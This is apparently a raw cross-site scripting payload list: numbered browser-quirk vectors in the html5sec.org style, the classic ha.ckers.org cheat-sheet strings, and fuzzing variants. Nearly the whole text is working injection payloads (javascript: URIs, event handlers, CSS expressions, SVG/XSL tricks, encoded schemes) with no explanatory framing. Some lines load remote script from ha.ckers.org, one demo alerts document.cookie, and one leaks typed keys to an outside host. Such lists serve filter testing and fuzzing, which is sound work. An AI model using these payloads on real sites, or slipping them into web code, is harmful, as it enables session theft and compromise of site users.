 onerror CDATA "alert(67)"
 onload CDATA "alert(2)">
]><img />//["'`-->]]>]</div>

<div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">
    <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">XXX</x>
</doc>//["'`-->]]>]</div>
<div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["'`-->]]>]</div><div id="70"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//["'`-->]]>]</div><div id="71"><// style=x:expression\28alert(71)\29>//["'`-->]]>]</div><div id="72"><form><button formaction="javascript:alert(72)">X</button>//["'`-->]]>]</div><div id="73"><event-source src="event.php" onload="alert(73)">//["'`-->]]>]</div><div id="74"><a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>//["'`-->]]>]</div><div id="75"><script<{alert(75)}/></script </>//["'`-->]]>]</div><div id="76"><?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>//["'`-->]]>]</div><div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>//["'`-->]]>]</div><div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["'`-->]]>]</div><div id="79"><object allowscriptaccess="always" data="test.swf"></object>//["'`-->]]>]</div><div id="80"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//["'`-->]]>]</div><div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(81)" xlink:type="simple"/>//["'`-->]]>]</div><div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["'`-->]]>]</div>
<div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>//["'`-->]]>]</div>
<div id="84"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(84)//#x"/>//["'`-->]]>]</div><div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["'`-->]]>]</div><div id="86"><body oninput=alert(86)><input autofocus>//["'`-->]]>]</div>
<div id="87"><svg xmlns="http://www.w3.org/2000/svg">
<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>
</svg>//["'`-->]]>]</div>

<div id="88"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">

<animation xlink:href="javascript:alert(88)"/>
<animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"/>

<image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"/>

<foreignObject xlink:href="javascript:alert(88)"/>
<foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E"/>

</svg>//["'`-->]]>]</div>

<div id="89"><svg xmlns="http://www.w3.org/2000/svg">
<set attributeName="onmouseover" to="alert(89)"/>
<animate attributeName="onunload" to="alert(89)"/>
</svg>//["'`-->]]>]</div>

<div id="90"><!-- Up to Opera 10.63 -->
<div style=content:url(test2.svg)></div>

<!-- Up to Opera 11.64 - see link below -->

<!-- Up to Opera 12.x -->
<div style="background:url(test5.svg)">PRESS ENTER</div>//["'`-->]]>]</div>

<div id="91">[A]
<? foo="><script>alert(91)</script>">
<! foo="><script>alert(91)</script>">
</ foo="><script>alert(91)</script>">
[B]
<? foo="><x foo='?><script>alert(91)</script>'>">
[C]
<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">
[D]
<% foo><x foo="%><script>alert(91)</script>">//["'`-->]]>]</div>
<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="93"><div style="list-style:url(http://foo.f)\20url(javascript:alert(93));">X</div>//["'`-->]]>]</div>
<div id="94"><svg xmlns="http://www.w3.org/2000/svg">
<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>
</svg>//["'`-->]]>]</div>

<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<feImage>
<set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,
PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>
</feImage>
</svg>//["'`-->]]>]</div>

<div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>
<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["'`-->]]>]</div>

<div id="97"><!-- IE 5-9 -->
<div id=d><x xmlns="><iframe onload=alert(97)"></div>
<script>d.innerHTML+='';</script>

<!-- IE 10 in IE5-9 Standards mode -->
<div id=d><x xmlns='"><iframe onload=alert(2)//'></div>
<script>d.innerHTML+='';</script>//["'`-->]]>]</div>

<div id="98"><div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div>
<script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["'`-->]]>]</div>

<div id="99">XXX<style>

*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */

<!--
--><!--*{color:red}   /* all UA */

*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */

</style>//["'`-->]]>]</div>
<div id="100"><img[a][b]src=x[d]onerror[c]=[e]"alert(100)">//["'`-->]]>]</div><div id="101"><a href="[a]java[b]script[c]:alert(101)">XXX</a>//["'`-->]]>]</div><div id="102"><img src="x` `<script>alert(102)</script>"` `>//["'`-->]]>]</div><div id="103"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//["'`-->]]>]</div>
<div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>
</svg>//["'`-->]]>]</div>
<div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["'`-->]]>]</div><div id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div><div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>
<div id="108"><!-- IE 5-8 standards mode -->
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(108)></a>">

<!-- IE 5-9 standards mode -->
<!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//">
<?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">//["'`-->]]>]</div>

<div id="109"><svg xmlns="http://www.w3.org/2000/svg">
<a id="x"><rect fill="white" width="1000" height="1000"/></a>
<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>
</svg>//["'`-->]]>]</div>

<div id="110"><svg xmlns="http://www.w3.org/2000/svg">
<path d="M0,0" style="marker-start:url(test4.svg#a)"/>
</svg>//["'`-->]]>]</div>
<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
<div id="113"><div id="x">XXX</div>
<style>

#x{font-family:foo[bar;color:green;}

#y];color:red;{}

</style>//["'`-->]]>]</div>
<div id="114"><x style="background:url('x[a];color:red;/*')">XXX</x>//["'`-->]]>]</div>
<div id="115"><!--[if]><script>alert(115)</script -->
<!--[if<img src=x onerror=alert(2)//]> -->//["'`-->]]>]</div>

<div id="116"><div id="x">x</div>
<xml:namespace prefix="t">
<import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;">//["'`-->]]>]</div>

<div id="117"><a href="http://attacker.org">
    <iframe src="http://example.org/"></iframe>
</a>//["'`-->]]>]</div>

<div id="118"><div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');">
    <h1>Drop me</h1>
</div>

<iframe src="http://www.example.org/dropHere.html"></iframe>//["'`-->]]>]</div>

<div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>

<textarea type="text" cols="50" rows="10"></textarea>//["'`-->]]>]</div>

<div id="120"><script>
function makePopups(){
    for (i=1;i<6;i++) {
        window.open('popup.html','spam'+i,'width=50,height=50');
    }
}
</script>

<body>
<a href="#" onclick="makePopups()">Spam</a>//["'`-->]]>]</div>

<div id="121"><html xmlns="http://www.w3.org/1999/xhtml"
xmlns:svg="http://www.w3.org/2000/svg">
<body style="background:gray">
<iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>
<svg:svg>
<svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">
    <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>
    <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>
</svg:mask>
</svg:svg>
</body>
</html>//["'`-->]]>]</div>
<div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'`-->]]>]</div>
<div id="123"><span class=foo>Some text</span>
<a class=bar href="http://www.example.org">www.example.org</a>

<script src="http://code.jquery.com/jquery-1.4.4.js"></script>
<script>
$("span.foo").click(function() {
alert('foo');
$("a.bar").click();
});
$("a.bar").click(function() {
alert('bar');
location="http://html5sec.org";
});
</script>//["'`-->]]>]</div>

<div id="124"><script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10
<script src="\\example.com\foo.js"></script> // Safari 5.0//["'`-->]]>]</div>

<div id="125"><?xml version="1.0"?>
<?xml-stylesheet type="text/xml" href="#stylesheet"?>
<!DOCTYPE doc [
<!ATTLIST xsl:stylesheet
  id    ID    #REQUIRED>]>
<svg xmlns="http://www.w3.org/2000/svg">
    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(125)"></iframe>
        </xsl:template>
    </xsl:stylesheet>
    <circle fill="red" r="40"></circle>
</svg>//["'`-->]]>]</div>

<div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>
<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["'`-->]]>]</div>

<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">
<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>
<handler id="y">alert(127)</handler>
</svg>//["'`-->]]>]</div>
<div id="128"><svg><style>&lt;img/src=x onerror=alert(128)// </b>//["'`-->]]>]</div>
<div id="129"><svg>
<image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>")'>
<!--
Same effect with
<image filter='...'>
-->
</svg>//["'`-->]]>]</div>

<div id="130"><math href="javascript:alert(130)">CLICKME</math>

<math>
<!-- up to FF 13 -->
<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>

<!-- FF 14+ -->
<maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>
</math>//["'`-->]]>]</div>

<div id="131"><b>drag and drop one of the following strings to the drop box:</b>
<br/><hr/>
jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//
<br/><hr/>
feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//
<br/><hr/>
feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b>
<br/><hr/>
feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//
<br/><hr/>
<div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>//["'`-->]]>]</div>

<div id="132"><!doctype html>
<form>
<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
<br>
<input name="secret" type="password">
</form>
<!-- injection --><svg height="50px">
<image xmlns:xlink="http://www.w3.org/1999/xlink">
<set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />
<set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />
<set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />
<set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />
</image>
</svg>//["'`-->]]>]</div>
<div id="133"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//["'`-->]]>]</div>
<div id="134"><xmp>
<%
</xmp>
<img alt='%></xmp><img src=xx:x onerror=alert(134)//'>

<script>
x='<%'
</script> %>/
alert(2)
</script>

XXX
<style>
*['<!--']{}
</style>
-->{}
*{color:red}</style>//["'`-->]]>]</div>

<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
<template match="/">
<eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(135)</eval>
<if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if>
</template>
</stylesheet>//["'`-->]]>]</div>

<div id="136"><form action="" method="post">
<input name="username" value="admin" />
<input name="password" type="password" value="secret" />
<input name="injected" value="injected" dirname="password" />
<input type="submit">
</form>//["'`-->]]>]</div>

<div id="137"><svg>
<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
<circle r="400"></circle>
<animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />
</a>//["'`-->]]>]</div>
<div id="138"><link rel="import" href="test.svg" />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />//["'`-->]]>]</div>undefined
<SCRIPT>alert('XSS');</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
<IMG SRC="javascript:alert('XSS')"
<SCRIPT>a=/XSS/
\";alert('XSS');//
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="mocha:[code]">
<IMG SRC="livescript:[code]">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<XSS STYLE='no\xss:noxss("*//*");
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
getURL("javascript:alert('XSS')")
a="get";
<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
<HTML><BODY>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
'`"><\x3Cscript>javascript:alert(1)</script>        
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script>
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
<object onError object onError="javascript:javascript:alert(1)"></object onError>
<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
<body onload body onload="javascript:javascript:alert(1)"></body onload>
<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
\x3Cscript>javascript:alert(1)</script>
'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
<script>javascript:alert(1)</script\x0D
<script>javascript:alert(1)</script\x0A
<script>javascript:alert(1)</script\x0B
<script charset="\x22>javascript:alert(1)</script>
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
`"'><img src='#\x27 onerror=javascript:alert(1)>
<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
<script>/* *\x2A/javascript:alert(1)// */</script>
<script>/* *\x00/javascript:alert(1)// */</script>
<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
<script src="data:\xD4\x8F,javascript:alert(1)"></script>
<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
<script src="data:\xCB\x8F,javascript:alert(1)"></script>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
ABC<div style="x:expression\x00(javascript:alert(1)">DEF
ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x09expression(javascript:alert(1)">DEF
